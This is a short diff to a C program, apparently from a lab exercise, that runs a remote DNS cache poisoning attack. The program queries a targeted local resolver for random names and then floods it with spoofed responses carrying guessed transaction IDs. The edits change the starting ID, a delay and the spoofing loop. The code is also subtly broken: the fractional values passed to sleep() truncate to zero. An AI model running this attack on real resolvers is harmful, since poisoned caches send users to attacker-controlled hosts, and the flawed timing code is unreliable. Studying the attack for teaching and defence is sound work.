@@ -73,7 +73,7 @@ int main(int argc, char **argv)
   int i = 0;
   
   while (i < times) {
-    unsigned short transaction_id = 1000;
+    unsigned short transaction_id = 0x7fff;
   
     // Generate a random name with length HOSTNAME_QUERY_LENGTH = 5
     char name[HOSTNAME_QUERY_LENGTH + 1];
@@ -87,12 +87,12 @@ int main(int argc, char **argv)
                This will trigger the DNS server to send out DNS queries */
     send_dns_request(name, ip_req, n_req);
 
-    sleep(0.65);
+    sleep(0.90);
     
     /* Step 2. Send many spoofed responses to the targeted local DNS server,
                each one with a different transaction ID. */
-    for (; transaction_id < 1100; transaction_id++){
-      send_dns_response(name, ip_resp, n_resp, transaction_id);}
+    for (int j = 0; j < 200; j++){
+      send_dns_response(name, ip_resp, n_resp, transaction_id + j);}
       
     sleep(0.10);
   }
